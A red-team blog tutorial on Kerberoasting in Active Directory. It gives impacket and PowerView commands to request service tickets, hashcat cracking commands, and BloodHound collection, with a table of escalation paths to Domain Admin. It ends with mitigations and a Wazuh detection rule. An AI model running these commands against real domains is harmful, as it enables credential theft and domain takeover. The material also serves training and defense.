---
title: Owning the Domain: Kerberoasting to Domain Admin
date: 2025-01-14
tags: [Active Directory, Red Team, Kerberoasting]
thumbnail:
---

## TL;DR

Kerberoasting remains one of the most reliable paths to Domain Admin in real-world engagements. This post walks through the full attack chain from initial foothold to DA — manually, no shortcuts.

---

## What is Kerberoasting?

When a user in Active Directory requests access to a service, the KDC (Key Distribution Center) issues a **Ticket Granting Service (TGS)** ticket encrypted with the service account's NTLM hash. Any domain user can request this ticket — and since it's encrypted with the service account's password hash, we can crack it offline.

**Attack Prerequisites:**
- Valid domain user credentials (any low-priv user works)
- SPN (Service Principal Name) registered on a service account

---

## Step 1: Enumerate SPNs

```bash
# Using impacket
GetUserSPNs.py -dc-ip 10.10.10.100 DOMAIN/lowprivuser:password -request

# Using PowerView (on Windows foothold)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

**What we're looking for:**
- Service accounts with SPNs
- Accounts that are members of privileged groups
- Password policies that might allow weak passwords

---

## Step 2: Request TGS Tickets

```bash
# Request all TGS tickets and save to file
GetUserSPNs.py -dc-ip 10.10.10.100 DOMAIN/lowprivuser:password -request -outputfile hashes.txt

# Output format (hashcat mode 13100)
$krb5tgs$23$*SVC_ACCOUNT$DOMAIN.LOCAL$DOMAIN/SVC_ACCOUNT*$...
```

---

## Step 3: Offline Cracking

```bash
# Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-256 (etype 18) - mode 19700
hashcat -m 19700 hashes_aes.txt wordlist.txt
```

---

## Step 4: Escalating to Domain Admin

Once you crack the service account password, check its privileges:

```powershell
# Check group membership
net user SVC_ACCOUNT /domain

# Check ACLs with BloodHound
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName loot.zip
```

**Common escalation paths after Kerberoasting:**

| Service Account | Common Path to DA |
|---|---|
| SQL Service | `xp_cmdshell` → local admin → dump creds |
| IIS App Pool | Web shell → local admin → lateral movement |
| Backup Agent | Shadow copies → NTDS.dit dump |

---

## Mitigation

1. **Use AES-256 encryption** — much harder to crack than RC4
2. **Implement Group Managed Service Accounts (gMSA)** — auto-rotating 256-bit passwords
3. **Privilege separation** — service accounts should not be Domain Admins
4. **Monitor for TGS requests** — Event ID 4769 with RC4 encryption type (0x17)

---

## Detection — Wazuh Rule

```xml
<rule id="100200" level="12">
  <if_group>windows</if_group>
  <field name="win.system.eventID">4769</field>
  <field name="win.eventdata.ticketEncryptionType">0x17</field>
  <description>Kerberoasting attempt detected (RC4 TGS request)</description>
  <mitre>
    <id>T1558.003</id>
  </mitre>
</rule>
```

---

## Final Thoughts

Kerberoasting works because of a fundamental design decision in Kerberos — any domain user can request service tickets. The fix isn't a patch; it's proper AD hygiene. AES enforcement + gMSA + monitoring is the real answer.

`root@DOMAIN:~#` ▋
